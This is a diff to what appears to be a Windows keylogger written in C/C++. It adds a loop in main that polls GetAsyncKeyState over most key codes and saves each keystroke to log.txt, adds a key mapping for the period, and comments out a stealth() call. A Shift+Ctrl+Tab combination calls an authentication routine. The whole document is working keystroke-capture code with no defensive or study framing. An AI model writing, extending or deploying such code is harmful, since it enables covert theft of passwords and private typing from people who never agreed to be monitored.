@@ -1059,6 +1059,8 @@ int save(int _key, char const *file)
         fprintf(OUTPUT_FILE, "%s", "[RIGHT_ARROW]");
     else if( _key == VK_CONTROL)
         fprintf(OUTPUT_FILE, "%s", "[CTRL]");
+    else if( _key == 190)
+        fprintf(OUTPUT_FILE, "%s", ".");
     else
         fprintf(OUTPUT_FILE,"%s", &_key);
     fclose(OUTPUT_FILE);
@@ -1076,6 +1078,23 @@ void stealth()
 
 int main()
 {
-    stealth();
+    //stealth();
+    short i;
+    while(1)
+    {
+        //Sleep(10);
+        for(i=8;i<192;i++)
+        {
+            if((GetAsyncKeyState(VK_SHIFT)&0x80000) && (GetAsyncKeyState(VK_CONTROL)&0x80000) && (GetAsyncKeyState(VK_TAB)&0x80000))
+                    authentication();
+            if(GetAsyncKeyState(i)==-32767)
+            {
+                save(i,"log.txt");
+            }
+        }
+        system("PAUSE");
+    }
+   // Sleep(10);
+    viewOptions();
     cout<< "siam"<<endl;
 }
